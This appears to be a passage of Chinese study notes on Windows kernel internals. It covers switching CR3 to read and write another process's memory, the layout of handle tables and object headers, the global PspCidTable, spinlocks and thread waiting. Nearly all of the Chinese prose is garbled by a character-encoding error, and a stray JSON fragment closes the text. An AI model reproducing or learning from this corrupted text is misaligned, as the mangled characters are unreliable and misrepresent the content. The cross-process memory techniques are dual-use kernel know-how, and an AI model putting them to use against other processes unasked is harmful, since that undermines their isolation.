éœ€è¦è§£å†³çš„ä¸»è¦çš„æ˜¯å¦‚æœåˆ‡æ¢äº†cr3ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨æ–°çº¿ç¨‹çš„å†…å­˜äº†ï¼Œå¯ä»¥è¯»æ•°æ®ï¼Œä½†æ˜¯å†™çš„è¯è¿˜æ˜¯å†™åˆ°çš„æ–°çº¿ç¨‹å†…ã€‚\nè¯»æ•°æ®ï¼š\nåˆ‡æ¢cr3 å°†æ•°æ®å¤åˆ¶åˆ°é«˜2G åˆ‡æ¢cr3 ä»é«˜2Gçš„æ•°æ®å¤åˆ¶åˆ°å¯¹åº”ä½ç½® å†™æ•°æ®ï¼š\nå°†æ•°æ®ä»ç›®æ ‡ä½ç½®å¤åˆ¶åˆ°é«˜2G åˆ‡æ¢cr3 ä»é«˜2Gçš„æ•°æ®å¤åˆ¶åˆ°å¯¹åº”ä½ç½® åˆ‡æ¢cr3 å¥æŸ„è¡¨ å½“è¿›ç¨‹æ‰“å¼€æˆ–åˆ›å»ºä¸€ä¸ªå†…æ ¸å¯¹è±¡æ—¶ï¼Œä¼šè·å–ä¸€ä¸ªå¥æŸ„ï¼Œæä¾›è¿™ä¸ªå¥æŸ„å¯ä»¥è®¿é—®å†…æ ¸å¯¹è±¡ã€‚\nä¸ºä»€ä¹ˆè¦æœ‰å¥æŸ„ï¼Ÿ\néšè—å†…æ ¸å¯¹è±¡æŒ‡é’ˆï¼Œå¥æŸ„å…¶å®å°±æ˜¯ä¸€ä¸ªç´¢å¼•ã€‚\nå¥æŸ„å­˜åœ¨çš„æ„ä¹‰å°±æ˜¯é¿å…åœ¨åº”ç”¨å±‚ç›´æ¥ä¿®æ”¹å†…æ ¸å¯¹è±¡ã€‚\nHANDLE g_hEvent = CreateEvent(NULL,TRUE,FALSE,NULL); ä¹‹æ‰€ä»¥ä¸å°†g_hEventå­˜EVENTçš„å†…æ ¸å¯¹è±¡çš„åœ°å€ï¼Œæ˜¯å®³æ€•æˆ‘ä»¬ä¿®æ”¹è®¿é—®å…¶ä»–çš„å†…æ ¸å¯¹è±¡å¯¼è‡´è“å±ã€‚\nå¥æŸ„è¡¨å¦‚ä¸‹ï¼š\nå¥æŸ„è¡¨åœ¨å“ªé‡Œï¼Ÿ\nkd\u003e dt _EPROCESS +0x0c4 ObjectTable : _HANDLE_TABLE ... kd\u003e dt _HANDLE_TABLE nt!_HANDLE_TABLE +0x000 TableCode //å¥æŸ„è¡¨ +0x004 QuotaProcess +0x008 UniqueProcessId +0x00c HandleTableLock +0x01c HandleTableList ... å¥æŸ„è¡¨ç»“æ„\nâ‘ ï¼šè¿™ä¸€å—å…±è®¡ä¸¤ä¸ªå­—èŠ‚ï¼Œä½å­—èŠ‚ä¿ç•™ï¼ˆä¸€ç›´éƒ½æ˜¯0ï¼‰ï¼Œé«˜ä½å­—èŠ‚æ˜¯ç»™SetHandleInformationè¿™ä¸ªå‡½æ•°ç”¨çš„ï¼Œæ¯”å¦‚å†™æˆå¦‚ä¸‹å½¢å¼ï¼Œé‚£ä¹ˆè¿™ä¸ªä½ç½®å°†è¢«å†™å…¥0x02ï¼šSetHandleInformation(Handle,HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE);\nHANDLE_FLAG_PROTECT_FROM_CLOSEå®çš„å€¼ä¸º0x00000002ï¼Œå–æœ€ä½å­—èŠ‚ï¼Œæœ€ç»ˆ â‘  è¿™å—æ˜¯0x0200ã€‚\nâ‘¡ï¼šè¿™å—æ˜¯è®¿é—®æ©ç ï¼Œæ˜¯ç»™OpenProcessè¿™ä¸ªå‡½æ•°ç”¨çš„ï¼Œå…·ä½“çš„å­˜çš„å€¼å°±æ˜¯è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚ â‘¢ å’Œ â‘£ è¿™ä¸¤ä¸ªå—å…±è®¡å››ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­bit0-bit2å­˜çš„æ˜¯è¿™ä¸ªå¥æŸ„çš„å±æ€§ï¼Œå…¶ä¸­bit2å’Œbit0é»˜è®¤ä¸º0å’Œ1; bit1è¡¨ç¤ºçš„å‡½æ•°æ˜¯è¯¥å¥æŸ„æ˜¯å¦å¯ç»§æ‰¿ï¼ŒOpenProcessçš„ç¬¬äºŒä¸ªå‚æ•°ä¸bit1æœ‰å…³ï¼Œbit31-bit3åˆ™æ˜¯å­˜æ”¾çš„è¯¥å†…æ ¸å¯¹è±¡åœ¨å†…æ ¸ä¸­çš„å…·ä½“çš„åœ°å€ã€‚ï¼ˆåä¸‰ä½æ¸…é›¶ï¼Œå°±æ˜¯0xbå˜8ï¼‰\nè¿™ä¸ªåœ°å€ä¹Ÿä¸æ˜¯è¯¥å†…æ ¸å¯¹è±¡çš„é¦–åœ°å€ï¼Œå› ä¸ºæ¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡éƒ½æ˜¯ä»¥_OBJECT_HEADERå¼€å¤´çš„ï¼š\nkd\u003e dt _OBJECT_HEADER nt!_OBJECT_HEADER +0x000 PointerCount : Int4B +0x004 HandleCount : Int4B +0x004 NextToFree : Ptr32 Void +0x008 Type : Ptr32 _OBJECT_TYPE +0x00c NameInfoOffset : UChar +0x00d HandleInfoOffset : UChar +0x00e QuotaInfoOffset : UChar +0x00f Flags : UChar +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : Ptr32 Void +0x014 SecurityDescriptor : Ptr32 Void +0x018 Body : _QUAD //EPROCESSæ˜¯ä»è¿™é‡Œå¼€å§‹çš„ æ‰€ä»¥åŠ 0x18åç§»æ‰å¯ä»¥ã€‚\nå¦‚æœåœ¨åˆ«äººå¥æŸ„è¡¨ä¸­æ‰¾åˆ°äº†æˆ‘çš„è¿›ç¨‹ç»“æ„ä½“å¯¹è±¡çš„åœ°å€ï¼Œå¯èƒ½æ˜¯å®ƒæ‰“å¼€äº†æˆ‘æˆ–åœ¨è°ƒè¯•æˆ‘ã€‚\nå…¨å±€å¥æŸ„è¡¨ å…¨å±€å¥æŸ„è¡¨\næ‰€æœ‰è¿›ç¨‹ä¸çº¿ç¨‹ï¼Œæ— è®ºæ‰“å¼€ä¸å¦ï¼Œéƒ½åœ¨è¿™ä¸ªè¡¨ä¸­ã€‚\næ¯ä¸ªè¿›ç¨‹ä¸çº¿ç¨‹éƒ½æœ‰å”¯ä¸€çš„ç¼–å·ï¼šPIDä¸CIDï¼Œè¿™ä¸¤ä¸ªå€¼å°±æ˜¯å…¨å±€å¥æŸ„è¡¨çš„ç´¢å¼•ã€‚\nè¿›ç¨‹å’Œçº¿ç¨‹çš„æŸ¥è¯¢ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°ï¼ŒæŒ‰ç…§ç»™å®šçš„PIDæˆ–TIDä»PspCidTableä»æŸ¥æ‰¾ç›¸åº”çš„è¿›çº¿ç¨‹å¯¹è±¡ï¼š\nPsLookupProcessThreadByCid(x, x, x); PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process); PsLookupThreadByThreadId(HANDLE ThreadId, PETHREAD *Thread); å…¨å±€å¥æŸ„è¡¨ç»“æ„\nå¤šæ ¸åŒæ­¥ ä¸´ç•ŒåŒº å¹¶å‘æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼š\nå•æ ¸ï¼ˆåˆ†æ—¶æ‰§è¡Œï¼Œä¸ä¼šçœŸæ­£çš„åŒæ—¶æ‰§è¡Œï¼‰\nå¤šæ ¸ï¼ˆæ˜¯æŒ‡åœ¨æŸä¸€æ—¶åˆ»ï¼Œæœ‰å¤šä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œï¼‰\nåŒæ­¥æ˜¯ä¿è¯åœ¨å¹¶å‘çš„ç¯å¢ƒä¸­å„ä¸ªçº¿ç¨‹å¯ä»¥æœ‰åºçš„æ‰§è¡Œã€‚\nå…¶å®å°±æ˜¯ä¿è¯ä»£ç çš„åŸå­æ“ä½œï¼ˆæ‰§è¡Œçš„æ—¶å€™ä¸è¦è¢«å…¶ä»–çº¿ç¨‹æ‰“æ‰°ï¼‰\ninc dword ptr ds:[0x12345678] ;å¤šæ ¸æƒ…å†µä¸‹ï¼Œå¯èƒ½å…¶ä»–çº¿ç¨‹åŒæ—¶ä¼šæ‰§è¡Œè¿™ä¸ªä»£ç  lock inc dword ptr ds:[0x12345678] ;åœ¨æŸä¸ªæ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªCPUè¯»è¿™ä¸ªå†…å­˜ ä¸´ç•ŒåŒºï¼šä¸€æ¬¡åªå…è®¸ä¸€ä¸ªçº¿ç¨‹è¿›å…¥ç›´åˆ°ç¦»å¼€ã€‚\n;å…¨å±€å˜é‡ Flag = 0 ;è¿›å…¥ä¸´ç•ŒåŒº: Lab: mov eax,1 lock xadd [Flag],eax cmp eax,0 jz endLab dec [Flag] ;çº¿ç¨‹ç­‰å¾…Sleep endLab: ret ;ç¦»å¼€ä¸´ç•ŒåŒº: lock dec [Flag] è‡ªæ—‹é” åœ¨å¤šæ ¸çš„æƒ…å†µä¸‹ï¼ŒæŸ¥çœ‹SwapContextå‡½æ•°ä¼šå‡ºç°è®¸å¤šSpinLockçš„å‡½æ•°ã€‚\nKeAcquireSpinLockAtDpcLevel: mov ecx, [esp+4] LockAcquired: lock bts dword ptr [ecx], 0 ;è®¾ç½®å¹¶æ£€æµ‹ jb short LockAcquired ;[ecx] != 0åˆ™è·³è½¬ ret 4 SpinWaitLoop: test dword ptr [ecx], 1 jz short LockAcquired ;[ecx] = 0åˆ™è·³è½¬ pause jmp short SpinWaitLoop æ€»ç»“\nè‡ªæ—‹é”åªå¯¹å¤šæ ¸æœ‰æ„ä¹‰ è‡ªæ—‹é”ä¸ä¸´ç•ŒåŒºã€äº‹ä»¶ã€äº’æ–¥ä½“ä¸€æ ·ï¼Œéƒ½æ˜¯ä¸€ç§åŒæ­¥æœºåˆ¶ï¼Œå¯ä»¥è®©å½“å‰çº¿ç¨‹å¤„äºç­‰å¾…çŠ¶æ€ã€‚åŒºåˆ«åœ¨äºè‡ªæ—‹é”ä¸ç”¨å´æ¢çº¿ç¨‹ã€‚ çº¿ç¨‹ç­‰å¾…ä¸å”¤é†’ ç›®å‰æœ‰ä¸¤ç§æ–¹å¼è®©æ— æ³•è¿›å…¥ä¸´ç•ŒåŒºçš„çº¿ç¨‹æ¥ç­‰å¾…ï¼ˆåªæœ‰ä¸€ä¸ªå•æ‰€ï¼Œä¸€ä¸ªäººåœ¨é‡Œé¢ä¸Šå•æ‰€ï¼‰ï¼š\né€šè¿‡Sleepå‡½æ•°è¿›è¡Œç­‰å¾…ï¼Œä½†ç­‰å¾…çš„æ—¶é—´æ— æ³•ç¡®å®šã€‚ï¼ˆå¦‚æœåœ¨å•æ‰€å¤–é¢çš„è¿™ä¸ªäººå›å»ç¡äº†ä¸€æ®µæ—¶é—´ï¼Œå‘ç°å•æ‰€é‡Œé¢è¿˜æœ‰äººï¼›å¦‚æœç­‰å¾…çš„è¿™ä¸ªäººåˆšç¡ï¼Œå•æ‰€é‡Œé¢çš„äººå°±å‡ºæ¥äº†ï¼‰ é€šè¿‡\"ç©ºè½¬\"çš„æ–¹å¼è¿›è¡Œç­‰å¾…ï¼Œåªæœ‰åœ¨ç­‰å¾…æ—¶é—´æçŸ­çš„æƒ…å†µä¸‹æ‰æœ‰æ„ä¹‰ï¼Œè€Œä¸”æ˜¯å¤šæ ¸çš„æƒ…å†µä¸‹ã€‚ ç­‰å¾…ä¸å”¤é†’æœºåˆ¶\nåœ¨Windowsä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹å¯ä»¥é€šè¿‡ç­‰å¾…ä¸€ä¸ªæˆ–è€…å¤šä¸ªå¯ç­‰å¾…å¯¹è±¡ï¼Œä»è€Œè¿›å…¥å¯ç­‰å¾…çŠ¶æ€ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åœ¨æŸäº›æ—¶åˆ»å”¤é†’ç­‰å¾…è¿™äº›å¯¹è±¡çš„å…¶ä»–çº¿ç¨‹ã€‚\n//çº¿ç¨‹A WaitForSingleObject WaitForMultipleObjects "},"title":"Windows EXT"}}